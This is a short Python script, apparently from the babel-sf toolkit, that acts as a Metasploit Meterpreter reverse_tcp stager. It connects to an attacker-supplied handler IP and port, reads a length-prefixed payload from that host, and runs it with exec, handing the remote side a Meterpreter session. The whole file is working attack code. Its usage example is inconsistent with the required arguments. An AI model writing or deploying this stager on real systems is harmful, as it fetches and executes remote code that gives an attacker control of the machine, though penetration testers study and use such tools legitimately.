#!/usr/bin/ruby
#
# msf-meterpreter-reverse_tcp.py version 0.1
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#
import socket,struct
import sys
import datetime

i = datetime.datetime.today()

instructions = 	"msf-meterpreter-reverse_tcp.py ( https://github.com/attackdebris/babel-sf )\n" +\
		"\nUsage:" +\
		"\npython msf-meterpreter-reverse_tcp.py [remote handler IP] [port]" +\
		"\ne.g. python msf-meterpreter-reverse_tcp.py 4444"

if len(sys.argv) <3:
	print instructions
elif len(sys.argv) >3:
	print "Too many arguments, check your syntax."
elif len(sys.argv) ==3:
	port=int(sys.argv[2])
	host=sys.argv[1]
	s=socket.socket(2,1)
	s.connect ((host, port))
	print "Starting msf-meterpreter-reverse_tcp.py ( https://github.com/attackdebris/babel-sf ) at %s-%s-%s %s:%s" % (i.year, i.month, i.day, i.hour, i.minute)
	print "Attemping to connect to %s on TCP port %s...." % (host, port)
	l=struct.unpack('>I',s.recv(4))[0]
	d=s.recv(4096)
	while len(d)!=l:
	  d+=s.recv(4096)
	exec(d,{'s':s})